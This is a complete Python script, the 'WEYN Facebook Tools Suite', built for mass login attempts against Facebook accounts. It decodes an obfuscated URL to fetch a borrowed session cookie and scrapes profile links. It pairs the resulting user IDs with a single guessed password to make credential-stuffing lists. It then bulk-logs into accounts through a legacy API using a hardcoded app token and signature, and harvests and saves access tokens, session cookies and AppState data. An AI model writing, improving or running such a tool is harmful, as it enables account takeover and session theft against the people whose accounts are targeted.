#!/usr/bin/env python3
import requests
import json
import base64
import marshal
import os
import sys
from datetime import datetime
from bs4 import BeautifulSoup as bs

PURPLE = '\033[95m'
GREEN = '\033[92m'
RED = '\033[1;91m'
YELLOW = '\033[1;93m'
BLUE = '\033[1;94m'
CYAN = '\033[1;96m'
PINK = '\033[1;95m'
BRIGHT_RED = '\033[31;1m'
BRIGHT_BLUE = '\033[94;1m'
RESET = '\033[0m'

class WeynTool:
    def __init__(self):
        self.session = requests.Session()
        self.cookie = None
        self.load_cookie()
        
    def load_cookie(self):
        try:
            req = self.session.get(marshal.loads(base64.b64decode(b'+kZodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2hvbmRva2VyWGhhc2FuL2Jpbi9tYWluL2Nvb2tpZS5qc29u'))).json()
            self.cookie = {'cookie': req['cookie']['facebook']}
        except requests.exceptions.ConnectionError:
            print(f'\n\t{YELLOW}[{RED}!{YELLOW}]{RED} Network Connection Error')
            self.cookie = None
        except Exception:
            self.cookie = None
    
    def clear_screen(self):
        os.system('clear' if os.name != 'nt' else 'cls')
    
    def print_banner(self):
        self.clear_screen()
        print()
        print(f'\033[31m██     ██ ███████ ██    ██ ███    ██')
        print(f'\033[31m██     ██ ██       ██  ██  ████   ██')
        print(f'\033[31m██  █  ██ █████     ████   ██ ██  ██')
        print(f'\033[31m██ ███ ██ ██         ██    ██  ██ ██')
        print(f'\033[31m ███ ███  ███████    ██    ██   ████')
        print(f'\033[32m ▀▀▀ ▀▀▀  ▀▀▀▀▀▀▀    ▀▀    ▀▀   ▀▀▀▀')
        print(f'\n{CYAN}[ {YELLOW}FACEBOOK TOOLS SUITE {CYAN}]')
        print(f'{CYAN}[ Developed by {PINK}WEYN DUMP {CYAN}]')
        print()
    
    def main_menu(self):
        while True:
            self.print_banner()
            print(f'{BRIGHT_BLUE}╔═════════════════════════════════════════════╗')
            print(f'{BRIGHT_BLUE}║                                             ║')
            print(f'{BRIGHT_BLUE}║    {YELLOW}[1]{RESET} {BRIGHT_RED}UID|Pass{RESET}       {YELLOW}[4]{RESET} {BRIGHT_RED}AppState{RESET}        {BRIGHT_BLUE}║')
            print(f'{BRIGHT_BLUE}║                                             ║')
            print(f'{BRIGHT_BLUE}║    {YELLOW}[2]{RESET} {BRIGHT_RED}Token{RESET}          {YELLOW}[5]{RESET} {BRIGHT_RED}C_USER{RESET}          {BRIGHT_BLUE}║')
            print(f'{BRIGHT_BLUE}║                                             ║')
            print(f'{BRIGHT_BLUE}║    {YELLOW}[3]{RESET} {BRIGHT_RED}Cookie{RESET}         {YELLOW}[6]{RESET} {BRIGHT_RED}All Data{RESET}        {BRIGHT_BLUE}║')
            print(f'{BRIGHT_BLUE}║                                             ║')
            print(f'{BRIGHT_BLUE}╠═════════════════════════════════════════════╣')
            print(f'{BRIGHT_BLUE}║                                             ║')
            print(f'{BRIGHT_BLUE}║             {YELLOW}[0]{RESET} {BRIGHT_RED}Exit{RESET}                    {BRIGHT_BLUE}║')
            print(f'{BRIGHT_BLUE}║                                             ║')
            print(f'{BRIGHT_BLUE}╚═════════════════════════════════════════════╝{RESET}')
            print()
            try:
                choice = input(f'{GREEN}> {RESET}')
                
                if choice == '1':
                    self.link_to_uid_converter()
                elif choice == '2':
                    self.get_tokens('token')
                elif choice == '3':
                    self.get_tokens('cookie')
                elif choice == '4':
                    self.get_tokens('appstate')
                elif choice == '5':
                    self.get_tokens('c_user')
                elif choice == '6':
                    self.get_tokens('all')
                elif choice == '0':
                    self.clear_screen()
                    print(f'{CYAN}Thank you for using WEYN!{RESET}')
                    break
                else:
                    print(f'{RED}Invalid option!{RESET}')
                    input(f'{GREEN}Press Enter...{RESET}')
            except (KeyboardInterrupt, EOFError):
                self.clear_screen()
                print(f'{CYAN}Thank you for using WEYN!{RESET}')
                break
    
    def get_uid_from_link(self, fbd):
        try:
            if not self.cookie:
                return None, 'Cookie not loaded'
            
            if 'profile.php?id=' in str(fbd):
                uid = str(fbd).split('profile.php?id=')[1].split('&')[0]
                fbid = 'https://mbasic.facebook.com/profile.php?id=' + uid
            else:
                fbid = fbd
                if 'www.facebook' in str(fbd):
                    fbid = str(fbd).replace('www.facebook', 'mbasic.facebook')
                elif 'm.facebook' in str(fbd):
                    fbid = str(fbd).replace('m.facebook', 'mbasic.facebook')
                elif 'facebook.com' in str(fbd) and 'mbasic' not in str(fbd):
                    fbid = str(fbd).replace('facebook.com', 'mbasic.facebook.com')
                uid = None
            
            req2 = bs(self.session.get(fbid, cookies=self.cookie).text, 'html.parser')
            title_text = str(req2.title.string if req2.title else 'Unknown')
            name = title_text
            
            if not uid:
                for link in req2.find_all('a', href=True):
                    if 'privacy/touch/block/confirm/?' in str(link):
                        href = link.get('href')
                        if href:
                            uid = str(href.split('&')[0]).split('=')[1]
                            break
            
            if uid:
                return uid, name
            else:
                return None, 'UID not found'
        except requests.exceptions.ConnectionError:
            return None, 'Network Error'
        except Exception as e:
            return None, f'Error: {str(e)}'
    
    def link_to_uid_converter(self):
        while True:
            self.print_banner()
            print(f'{YELLOW}Link to UID|Password Converter{RESET}')
            password = input(f'{GREEN}Password: {RESET}')
            if password.lower() in ['0', 'b', 'back']:
                break
            print(f'{CYAN}Enter links (blank to finish):{RESET}')
            
            links = []
            while True:
                link = input()
                if link.strip().lower() in ['0', 'b', 'back']:
                    return
                if link.strip() == '':
                    break
                links.append(link.strip())
            
            if not links:
                print(f'{RED}No links!{RESET}')
                input(f'{GREEN}Press Enter...{RESET}')
                continue
            
            print(f'{CYAN}Processing {len(links)}...{RESET}')
            results = []
            for i, fbd in enumerate(links, 1):
                uid, name = self.get_uid_from_link(fbd)
                if uid:
                    result = str(uid) + '|' + password
                    results.append(result)
                    print(f'{GREEN}[{i}] ✔ {result}{RESET}')
                else:
                    print(f'{RED}[{i}] ✗ {name}{RESET}')
            
            if results:
                print(f'\n{CYAN}═══ COPY BELOW ═══{RESET}')
                for result in results:
                    print(result)
                print(f'{CYAN}═══ TOTAL: {len(results)} ═══{RESET}\n')
                
                if input(f'{GREEN}Save? (y/n): {RESET}').lower() == 'y':
                    filename = input(f'{GREEN}File (results.txt): {RESET}') or 'results.txt'
                    try:
                        with open(filename, 'w') as f:
                            f.write('\n'.join(results))
                        print(f'{GREEN}Saved: {filename}{RESET}')
                    except Exception as e:
                        print(f'{RED}Error: {str(e)}{RESET}')
            else:
                print(f'{RED}All failed!{RESET}')
            
            choice = input(f'{GREEN}Press Enter to continue or 0 to go back...{RESET}')
            if choice.lower() in ['0', 'b', 'back']:
                break
    
    def get_facebook_token_data(self, email, password):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        payload = {
            'email': email,
            'password': password,
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'format': 'JSON',
            'sdk_version': '2',
            'generate_session_cookies': '1',
            'locale': 'en_US',
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'
        }
        
        try:
            response = self.session.post(
                "https://b-api.facebook.com/method/auth.login",
                headers=headers,
                data=payload,
                timeout=30
            )
            data = response.json()
            
            if 'access_token' in data:
                token = data['access_token']
                cookies = data.get('session_cookies', [])
                cookie_str = '; '.join([f"{c['name']}={c['value']}" for c in cookies])
                
                c_user = next((c['value'] for c in cookies if c['name'] == 'c_user'), None)
                datr = next((c['value'] for c in cookies if c['name'] == 'datr'), None)
                
                appstate = [
                    {
                        "key": c['name'],
                        "value": c['value'],
                        "domain": ".facebook.com",
                        "path": "/",
                        "secure": False,
                        "httpOnly": False
                    } for c in cookies
                ]
                
                return {
                    'success': True,
                    'token': token,
                    'cookie': cookie_str,
                    'c_user': c_user,
                    'datr': datr,
                    'appstate': appstate
                }
            else:
                error_msg = data.get('error_msg', 'Login failed. Unknown error.')
                return {'success': False, 'error': error_msg}
        
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_tokens(self, mode):
        mode_titles = {
            'token': 'Token', 'cookie': 'Cookie', 'appstate': 'AppState',
            'c_user': 'C_USER', 'all': 'All Data'
        }
        
        while True:
            self.print_banner()
            print(f'{YELLOW}Get {mode_titles[mode]}{RESET}')
            print(f'{CYAN}Paste uid|password (Enter twice):{RESET}')
            
            accounts = []
            lines = []
            
            try:
                while True:
                    line = input()
                    if line.strip().lower() in ['0', 'b', 'back']:
                        return
                    if not line:
                        break
                    lines.append(line)
            except (KeyboardInterrupt, EOFError):
                if not lines:
                    print(f'{RED}Cancelled{RESET}')
                    input(f'{GREEN}Press Enter...{RESET}')
                    break
            
            for line in lines:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                parts = line.split('|', 1)
                if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                    accounts.append((parts[0].strip(), parts[1].strip()))
            
            if not accounts:
                print(f'{RED}No accounts!{RESET}')
                input(f'{GREEN}Press Enter...{RESET}')
                continue
            
            print(f'{CYAN}Processing {len(accounts)}...{RESET}')
            successful = 0
            failed = 0
            results = []
            
            for i, (uid, password) in enumerate(accounts, 1):
                print(f'[{i}/{len(accounts)}] {uid}...', end=' ')
                result = self.get_facebook_token_data(uid, password)
                
                if result['success']:
                    print(f'{GREEN}✓{RESET}')
                    successful += 1
                    results.append({
                        'uid': uid, 'status': 'success',
                        'token': result['token'], 'cookie': result['cookie'],
                        'c_user': result['c_user'], 'datr': result['datr'],
                        'appstate': result['appstate']
                    })
                else:
                    print(f'{RED}✗ {result["error"]}{RESET}')
                    failed += 1
            
            print(f'{CYAN}Total:{len(accounts)} Success:{successful} Failed:{failed}{RESET}')
            
            if successful > 0:
                self.display_results(results, mode)
                if input(f'{GREEN}Save? (y/n): {RESET}').lower() == 'y':
                    self.save_token_results(results, mode)
            
            choice = input(f'{GREEN}Press Enter to continue or 0 to go back...{RESET}')
            if choice.lower() in ['0', 'b', 'back']:
                break
    
    def display_results(self, results, mode):
        print(f'\n{CYAN}═══ COPY BELOW ═══{RESET}')
        
        for result in results:
            if result['status'] == 'success':
                if mode == 'token':
                    print(f'{result["uid"]}|{result["token"]}')
                elif mode == 'cookie':
                    print(f'{result["cookie"]}')
                elif mode == 'c_user':
                    print(f'{result["uid"]}|{result["c_user"]}')
                elif mode == 'appstate':
                    print(f'{json.dumps(result["appstate"])}')
                elif mode == 'all':
                    print(f'\nUID: {result["uid"]}')
                    print(f'Token: {result["token"]}')
                    print(f'Cookie: {result["cookie"]}')
                    print(f'C_USER: {result["c_user"]}')
                    print(f'AppState: {json.dumps(result["appstate"])}')
        print(f'{CYAN}═══════════════{RESET}')
    
    def save_token_results(self, results, mode):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{mode}_{timestamp}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 80 + "\n")
                f.write(f"WEYN - Facebook {mode.upper()} Generator Results\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                
                for result in results:
                    if result['status'] == 'success':
                        f.write(f"\n{'='*80}\n")
                        f.write(f"UID: {result['uid']}\n")
                        f.write(f"Status: SUCCESS\n\n")
                        
                        if mode in ['token', 'all']:
                            f.write(f"Access Token:\n{result['token']}\n\n")
                        if mode in ['cookie', 'all']:
                            f.write(f"Cookie:\n{result['cookie']}\n\n")
                        if mode in ['c_user', 'all']:
                            f.write(f"C_USER: {result['c_user']}\n")
                            f.write(f"DATR: {result['datr']}\n\n")
                        if mode in ['appstate', 'all']:
                            f.write(f"AppState:\n{json.dumps(result['appstate'], indent=2)}\n")
                        
                        f.write(f"{'='*80}\n")
            
            print(f'\n\t{YELLOW}[{GREEN}✓{YELLOW}]{RESET} Results saved to {GREEN}{filename}{RESET}')
        except Exception as e:
            print(f'\n\t{YELLOW}[{RED}!{YELLOW}]{RED} Failed to save file: {str(e)}{RESET}')

if __name__ == "__main__":
    tool = WeynTool()
    tool.main_menu()
